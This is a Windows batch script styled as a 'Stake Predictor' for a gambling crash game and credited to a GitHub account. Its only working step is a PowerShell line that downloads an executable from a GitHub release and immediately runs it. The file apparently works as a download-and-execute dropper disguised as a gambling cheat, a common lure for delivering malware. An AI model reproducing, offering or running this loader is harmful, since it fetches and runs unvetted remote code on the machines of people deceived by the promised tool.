@echo off

title Stake Predictor
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/IWcommunityFR
echo.

powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/stake-crash-preditor/releases/download/Stake-Crash-Predictor/stake-crash.exe';$file='stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
